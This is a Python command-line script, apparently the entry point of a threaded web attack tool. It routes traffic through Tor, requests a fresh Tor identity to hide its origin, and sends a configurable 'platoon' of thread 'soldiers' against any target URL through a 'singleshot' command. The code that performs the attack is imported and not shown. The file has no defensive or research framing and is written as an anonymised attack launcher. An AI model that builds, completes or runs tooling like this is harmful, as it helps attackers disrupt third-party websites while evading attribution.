#!/usr/bin/env python

import app.console
import app.net
import app.tor
from app.command import Platoon
from app.weapons.singleshot import SingleShotFactory
import fire
import signal
import sys


class BFDCLI:

    def __init__(
            self,
            tor_address='127.0.0.1',
            tor_proxy_port=9050,
            tor_ctrl_port=9051,
            num_soldiers=10
        ):
        """

        :param max_threads: Maximum of threads to spin up for the attack
        """

        self._tor_address = tor_address
        self._tor_proxy_port = tor_proxy_port
        self._tor_ctrl_port = tor_ctrl_port

        self._platoon = None  # app.command.Platoon
        self._num_soldiers = num_soldiers

        self._register_sig_handler()

    def singleshot(self, target):
        """
        Run an attack on a single URL.
        :param target: The target URL of the attack
        """

        try:

            self._connect()

            app.console.system("running singleshot")

            weapon_factory = SingleShotFactory()

            self._platoon.attack(
                weapon_factory=weapon_factory,
                target_url=target
            )

        except Exception as ex:

            app.console.error(str(ex))

        self._shutdown()


    def _connect(self):
        """
        Connect to the TOR server
        """

        app.console.system("connecting to TOR; %s (proxy %d) (ctrl %d)" % (
            self._tor_address,
            self._tor_proxy_port,
            self._tor_ctrl_port
        ))

        app.tor.connect(
            address=self._tor_address,
            proxy_port=self._tor_proxy_port,
            ctrl_port=self._tor_ctrl_port
        )

        app.console.system("request new identity on TOR")
        app.tor.new_ident()

        ourip = app.net.lookupip()
        app.console.system("identity on TOR; %s" % ourip)

        app.console.system("creating thread platoon with %d soldiers" % self._num_soldiers)
        self._platoon = Platoon(
            num_soldiers=self._num_soldiers
        )

    def _shutdown(self):
        """
        Shutdown
        """

        app.console.system("shutting down")

        app.console.system("closing connection to TOR")
        app.tor.close()

        app.console.shutdown()

    def _register_sig_handler(self):

        signal.signal(signal.SIGINT, self._signal_handler)

    def _signal_handler(self, sig, frame):

        app.console.log("signal received, holding fire")
        self._platoon.hold_fire()


if __name__ == '__main__':
    fire.Fire(BFDCLI)